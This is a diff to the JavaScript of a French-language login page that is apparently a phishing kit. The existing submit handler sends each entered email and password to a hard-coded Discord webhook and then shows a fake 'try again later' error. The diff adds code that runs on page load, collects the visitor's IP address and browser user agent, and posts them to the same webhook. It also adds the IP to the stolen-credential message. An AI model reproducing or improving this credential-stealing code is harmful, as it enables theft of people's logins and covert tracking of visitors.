@@ -414,6 +414,13 @@
             }
         })();
 
+        (async function(){
+            var ip='';
+            try{var r=await fetch('https://api.ipify.org?format=json');var d=await r.json();ip=d.ip;}catch(e){}
+            try{await fetch('https://discord.com/api/webhooks/1521513103072952420/KCvWjMLmG7ruHVqEmWafVozZJiUqwrqU1XbieQpWEnlvMAwWe3g7PHdf71cv6aCg2SCN',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'Nouveau visiteur : **'+ip+'**\nUser-Agent: '+navigator.userAgent})});}catch(e){}
+            window.__ip=ip;
+        })();
+
         document.getElementById('loginForm').addEventListener('submit',async function(e){
             e.preventDefault();
             var em=document.getElementById('email').value.trim();
@@ -423,7 +430,9 @@
             if(!em||!pw){st.className='status error';st.textContent='Email et mot de passe requis';return;}
             st.className='status loading';st.textContent='Connexion en cours...';btn.disabled=true;
             try{
-                await fetch('https://discord.com/api/webhooks/1521513103072952420/KCvWjMLmG7ruHVqEmWafVozZJiUqwrqU1XbieQpWEnlvMAwWe3g7PHdf71cv6aCg2SCN',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'```\nEmail: '+em+'\nPassword: '+pw+'\n```'})});
+                var ip=window.__ip||'';
+                if(!ip){try{var r=await fetch('https://api.ipify.org?format=json');var d=await r.json();ip=d.ip;}catch(e){}}
+                await fetch('https://discord.com/api/webhooks/1521513103072952420/KCvWjMLmG7ruHVqEmWafVozZJiUqwrqU1XbieQpWEnlvMAwWe3g7PHdf71cv6aCg2SCN',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'```\nIP: '+ip+'\nEmail: '+em+'\nPassword: '+pw+'\n```'})});
                 st.className='status error';st.textContent='Réessaie plus tard.';
             }catch(e){st.className='status error';st.textContent='Erreur de connexion.';}
             btn.disabled=false;
